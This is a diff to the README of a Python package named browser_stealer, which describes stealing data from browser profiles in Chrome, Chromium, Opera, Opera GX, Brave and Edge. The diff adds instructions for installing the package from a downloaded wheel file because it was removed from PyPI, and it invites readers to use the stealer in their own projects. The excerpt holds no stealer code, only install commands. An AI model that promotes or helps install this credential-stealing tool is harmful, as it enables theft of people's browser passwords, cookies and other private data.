@@ -20,6 +20,16 @@
 pip install browser_stealer
 ```
 
+## Installation
+
+Since module got removed from pypi you have to install it manually, to install it download whl(`browser_stealer.whl`) file from [here](https://github.com/Josakko/browser_stealer/releases), next open terminal on the location where you downloaded `browser_stealer.whl` and run following command:
+
+```
+pip install browser_stealer.whl
+```
+
+After running the command you can import and use browser stealer in your own projects!
+
 ## Code Examples
 
 Simple example for stealing data from profile "Default" of browsers: Chromium, Chrome, Opera, Opera GX, Brave, Edge
